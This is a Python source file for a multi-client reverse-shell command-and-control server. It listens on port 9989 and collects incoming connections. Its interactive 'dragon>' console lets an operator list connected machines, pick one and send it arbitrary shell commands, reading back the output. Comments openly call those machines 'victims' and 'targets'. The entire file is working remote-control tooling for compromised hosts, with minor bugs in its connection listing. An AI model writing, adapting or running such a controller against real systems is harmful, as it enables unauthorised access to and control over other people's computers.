import socket
import sys
import threading
import time
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


# creating a socket to connect two computers

def create_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 9989
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error:" + str(msg))

# socket is created
# now binding host/ip and port address with socket and listening for connections

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding Error:"+ str(msg) + "\n" + "Retrying...")
        bind_socket()

# Handling connections from multiple clients and saving to a list
# Closing and deleting all previous connections when server.py file is restarted

def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  #this function prevents timeout from happening

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established! |" + "IP" + address[0])

        except:
            print("Error accepting connections : ")

# Now we are working on second thread
# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands(CREATING OUR OWN SHELL/COMMAND PROMPT/TERMINAL)
# dragon> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# dragon> select 1
# 192.168.0.112> dir

def start_dragon():
    while True:
        cmd = input('dragon> ')

        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command is not recognized...")

# Display all the current active connections with the client/victim

def list_connections():
    results = ''

    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))  #here we are sending empty request to client to check whether the connection is active or not
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("---Clients---" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ','') # Target == id of client
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to : " + str(all_address[target][0]))

        print(str(all_address[target][0]) + ">", end="")
        return conn

        # 192.168.29.4>
    except:
        print("Selection ot valid ")
        return None

# Send commands to client\victim

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")

        except:
            print("Error Sending Commands...")
            break


# Create worker threads

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Do next job that is in the queue (handle connections, send commands)

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()

        if x == 2:
            start_dragon()

        queue.task_done()



def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


# Calling the functions

create_workers()
create_jobs()

